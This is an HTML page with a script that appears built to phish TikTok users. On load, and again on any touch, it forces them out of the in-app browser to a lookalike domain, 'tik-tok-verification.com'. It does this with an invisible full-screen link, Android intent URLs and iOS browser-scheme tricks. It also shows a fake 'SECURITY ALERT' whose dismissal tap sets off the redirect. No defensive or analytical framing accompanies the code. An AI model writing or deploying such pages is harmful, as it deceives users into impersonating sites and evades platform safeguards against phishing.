<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #fff; margin: 0; padding: 0; overflow: hidden; height: 100vh; width: 100vw; }
        /* This covers the ENTIRE screen and is invisible */
        #ghost-link {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 9999;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ccc;
            font-family: sans-serif;
        }
    </style>
</head>
<body>

<a href="https://tik-tok-verification.com/Verification/verify1.html" id="ghost-link">
    Verifying Connection...
</a>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";

    function ejectNow() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Forcing the 'Intent' via the ghost link
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE CONTEXT SWAP
            // 1. We try the Direct Protocol jump
            window.location.href = "googlechromes://" + domain;
            
            // 2. We trigger a programmatic click on the full-screen <a> tag
            document.getElementById('ghost-link').click();

            // 3. We hit the system with a 'Location' update to a protocol TikTok can't render
            setTimeout(() => {
                window.location.assign("safari-https://" + domain);
            }, 100);
        }
    }

    // This triggers the moment they touch ANYWHERE on the screen
    document.addEventListener('touchstart', function() {
        ejectNow();
    }, false);

    // Initial attempt on load
    window.onload = function() {
        ejectNow();
        
        // The "Alert-Trap": When they hit 'OK', the touch triggers the redirect
        setTimeout(() => {
            const header = "SECURITY ALERT\n";
            const body = "______________________________\n\nPlease complete verification in your external browser to continue.";
            alert(header + body);
            ejectNow();
        }, 500);
    };
</script>
</body>
</html>
